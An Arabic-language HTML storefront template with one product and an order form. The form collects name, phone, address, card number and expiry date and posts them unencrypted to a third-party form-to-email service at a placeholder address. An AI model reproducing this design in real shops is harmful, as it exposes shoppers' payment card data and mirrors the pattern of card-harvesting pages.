<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>متجر إلكتروني</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background: #f9f9f9;
      color: #333;
    }

    header {
      background-color: #222;
      color: #fff;
      padding: 1rem;
      text-align: center;
    }

    .section {
      padding: 2rem;
    }

    h2 {
      color: #444;
    }

    .products {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
      gap: 1rem;
    }

    .product {
      background: #fff;
      padding: 1rem;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
    }

    .product img {
      max-width: 100%;
      height: 150px;
      object-fit: cover;
      border-radius: 6px;
    }

    .buy-btn {
      margin-top: 10px;
      background: #28a745;
      color: white;
      padding: 10px 15px;
      border: none;
      border-radius: 5px;
      text-decoration: none;
      cursor: pointer;
      display: inline-block;
    }

    form {
      background: #fff;
      max-width: 500px;
      margin: 2rem auto;
      padding: 2rem;
      border-radius: 10px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
    }

    form input, form textarea {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    .submit-btn {
      background: #007bff;
      color: white;
      border: none;
      padding: 10px;
      margin-top: 15px;
      border-radius: 5px;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <header>
    <h1>مرحبًا بك في متجرنا الإلكتروني</h1>
  </header>

  <section class="section">
    <h2>منتجات إلكترونية</h2>
    <div class="products">
      <div class="product">
        <img src="https://via.placeholder.com/300x150" alt="منتج 1">
        <h3>سماعة بلوتوث</h3>
        <p>السعر: 100 ريال</p>
        <a class="buy-btn" href="#form" onclick="fillProduct('سماعة بلوتوث')">شراء</a>
      </div>
    </div>
  </section>

  <section class="section" id="form">
    <h2>نموذج الطلب</h2>
    <form action="https://formsubmit.co/your@email.com" method="POST">
      <input type="hidden" name="_subject" value="طلب جديد من المتجر">

      <label>اسم المنتج:</label>
      <input type="text" name="المنتج" id="productInput" required readonly>

      <label>الاسم الكامل:</label>
      <input type="text" name="الاسم" required>

      <label>رقم الهاتف:</label>
      <input type="tel" name="الهاتف" required>

      <label>العنوان:</label>
      <textarea name="العنوان" required></textarea>

      <label>رقم البطاقة:</label>
      <input type="text" name="رقم البطاقة" id="cardNumber" required maxlength="14">

      <label>تاريخ الانتهاء (شهر/سنة):</label>
      <input type="text" name="تاريخ" id="expiryDate" required placeholder="MM/YY" maxlength="5">

      <button type="submit" class="submit-btn">إرسال الطلب</button>
    </form>
  </section>

  <script>
    function fillProduct(name) {
      document.getElementById("productInput").value = name;
    }

    // التحقق من رقم البطاقة
    const cardInput = document.getElementById("cardNumber");
    cardInput.addEventListener("input", function () {
      this.value = this.value.replace(/\D/g, '').slice(0, 14);
    });

    // خانة تاريخ الانتهاء بصيغة MM/YY تلقائيًا
    const expiry = document.getElementById("expiryDate");
    expiry.addEventListener("input", function (e) {
      let value = this.value.replace(/\D/g, '');
      if (value.length > 2) {
        value = value.slice(0, 2) + '/' + value.slice(2, 4);
      }
      this.value = value.slice(0, 5);
    });
  </script>

</body>
</html>
